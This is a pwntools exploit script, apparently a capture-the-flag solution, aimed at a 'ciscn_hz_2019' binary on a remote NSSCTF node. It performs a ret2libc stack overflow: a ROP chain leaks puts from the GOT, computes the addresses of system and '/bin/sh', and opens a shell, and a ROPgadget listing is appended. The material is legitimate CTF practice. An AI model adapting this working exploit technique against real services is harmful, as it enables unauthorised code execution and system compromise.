from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28925)
# io=process("./ciscn_hz_2019")
libc=ELF("./libc-2.27.so")
elf=ELF("./ciscn_hz_2019")

pop_rdi=0x400c83
ret=0x4006b9

io.recvuntil(b"choice!\n")
io.sendline(b"1")

io.recvuntil(b"encrypted\n")
payload=b"a"*0x58+p64(pop_rdi)+p64(elf.got[b"puts"])+p64(elf.plt[b"puts"])+p64(0x4009a0)   
io.sendline(payload)

io.recvuntil(b"Ciphertext\n")
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym["puts"]
print("leak_addr"+hex(leak_addr))

str_sh=leak_addr+next(libc.search(b"/bin/sh\x00"))
sys_addr=leak_addr+libc.sym[b"system"]

io.recvuntil(b"encrypted\n")
payload=b"a"*0x58+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c80 : pop r14 ; pop r15 ; ret
# 0x0000000000400c82 : pop r15 ; ret
# 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007f0 : pop rbp ; ret
# 0x0000000000400aec : pop rbx ; pop rbp ; ret
# 0x0000000000400c83 : pop rdi ; ret
# 0x0000000000400c81 : pop rsi ; pop r15 ; ret
# 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b9 : ret
# 0x00000000004008ca : ret 0x2017
# 0x0000000000400962 : ret 0x458b
# 0x00000000004009c5 : ret 0xbf02

# Unique gadgets found: 15